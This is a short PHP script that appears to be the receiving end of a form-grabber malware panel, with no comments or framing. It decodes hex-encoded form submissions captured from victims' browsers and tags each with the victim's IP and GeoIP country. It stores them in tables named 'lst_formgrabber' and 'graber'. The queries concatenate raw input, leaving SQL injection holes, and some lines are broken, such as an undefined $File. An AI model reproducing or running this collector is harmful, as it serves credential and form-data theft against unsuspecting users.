<?php

$ip=$_SERVER['REMOTE_ADDR'];
include("funcs.php");
function hexToStr($hex)
{
    $string='';
    for ($i=0; $i < strlen($hex)-1; $i+=2)
    {
        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
}

if (isset($_POST['mode']))
{
    if ($_POST['mode'] == 1) {
        $content = hexToStr(dRead("content"));
        $sql = "SELECT `ID` FROM `lst_formgrabber` WHERE `content` = '".$content."';";
        $res = mysql_query($sql);
        if (mysql_num_rows($res) < 1) {
            $site = hexToStr(dRead("site"));
            $host = hexToStr(dRead("host"));

			
 $Handle = fopen($File, 'a');
 $Data = $content; 
 $rpla = str_replace("%40", "@", $Data);
 $rpl = str_replace("%20", " ", $rpla);
 $rpl1 = str_replace("&", "<br />", $rpl);

 $dateTime = new DateTime("now", new DateTimeZone('Europe/Warsaw'));
$date=$dateTime->format("Y-m-d");
 //MYSQL DATABASE///

include('config.php');
include("geoip.inc");
$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);
$country = geoip_country_name_by_addr($gi,$_SERVER['REMOTE_ADDR']);
geoip_close($gi);

mysql_query("INSERT INTO graber (ip, contry, url, site, data, time)
VALUES ('$ip', '$country', '$host$site', '$host', '$rpl1', '$date')");

 mysql_close($connect);
 

       }
    }
	
/*File = "YourFile.txt"; $ip=$_SERVER['REMOTE_ADDR'];
 $Handle = fopen($File, 'w');
 $Data = $content; 
 fwrite($Handle, $Data); 
 fclose($Handle); */

}		
die("");

?>